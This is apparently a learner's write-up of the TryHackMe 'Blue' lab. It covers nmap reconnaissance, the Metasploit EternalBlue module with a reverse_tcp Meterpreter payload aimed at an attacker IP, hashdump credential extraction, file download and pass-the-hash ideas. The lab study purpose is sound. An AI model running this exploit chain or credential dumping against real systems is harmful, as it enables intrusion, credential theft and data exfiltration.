# Room: Blue (TryHackMe)

**Date:** 8 Oct 2025  
**Path:** Cyber Security 101 
**Goal:** Follow a penetration test flow specific to this room: reconnaissance using Nmap, gaining access via MS17-010 (EternalBlue) exploit in Metasploit, using Meterpreter for post-exploitation (including `hashdump`), and capturing flags.

## 1. Key Concepts Learned

* **Recon**:

  * Used `nmap` for port and service discovery to identify vulnerable hosts and open services.  
  * Saved scan outputs for later import into Metasploit or documentation.  

* **Gain Access**:

  * Initial access was achieved using the **MS17-010 / EternalBlue** vulnerability.  
  * Used Metasploit (`msfconsole`) to select and configure the `exploit/windows/smb/ms17_010_eternalblue` module, then delivered a Meterpreter payload to get an interactive session.  
  * Workflow: `nmap` to find targets → `msfconsole` → `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS`/`set LHOST`/`set PAYLOAD` → `exploit`.

* **Post-exploitation (Meterpreter)**:

  * Once a Meterpreter session was obtained, used typical Meterpreter commands to gather info and move laterally.  
  * Used `hashdump` to extract password hashes from the compromised host (requires appropriate privileges).  
  * Other useful Meterpreter commands used: `sysinfo`, `getuid`, `ps`, `migrate`, `download` to exfiltrate files of interest.

* **Cracking / Credential Use**:

  * Extracted hashes via `hashdump` can be cracked offline with tools like `john` or `hashcat`, or used in pass-the-hash / lateral movement techniques.  
  * In this room, `hashdump` provided credentials and sensitive artifacts that helped progress to capture flags and further access.

* **Find flags!**:

  * User and root/administrator flags were located on the compromised VM; typical locations include user home directories and privileged locations (e.g., `C:\Users\<user>\Desktop\user.txt`, `C:\Windows\System32\config` or `C:\Users\Administrator\Desktop\root.txt`).  
  * Always document the steps taken to retrieve flags for reporting and reproducibility.

## 2. Commands / Tools Practiced

* `nmap -sC -sV -oA blue_scan <TARGET>` — service/port enumeration and save outputs.  
* `msfconsole` → `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS <target>` `set LHOST <attacker_ip>` `set PAYLOAD windows/x64/meterpreter/reverse_tcp` → `exploit`.  
* `sessions -l` / `sessions -i <id>` — list and interact with Meterpreter sessions.  
* `meterpreter> sysinfo`, `meterpreter> getuid`, `meterpreter> ps` — gather system context.  
* `meterpreter> hashdump` — dump NTLM hashes from the compromised host (requires SYSTEM).  
* `meterpreter> download C:\path\to\flag.txt` — retrieve flags/files.  

## 3. Takeaways

* In this box, MS17-010/EternalBlue was the direct route to compromise — always correlate Nmap findings with known CVEs and exploit modules.  
* Metasploit + Meterpreter provides a fast path from exploitation to post-exploitation (discovery, credential extraction, file exfiltration).  
* `hashdump` is a high-value post-exploitation command; handle extracted hashes responsibly and use them only in lab environments.  
* Documenting commands, options, and outputs is crucial for reports and reproducibility.

## 4. Next Steps

* Practice the full exploit chain in a local lab: Nmap → identify target → exploit via Metasploit → Meterpreter post-exploitation.  
* Learn defensive mitigations for MS17-010 (patching SMB, disabling SMBv1, network segmentation).  
* Practice cracking NTLM hashes offline and using extracted credentials for lateral movement in lab scenarios.  
* Improve reporting: include `-oA` scan outputs, Meterpreter session logs, and step-by-step screenshots or terminal outputs for each stage.
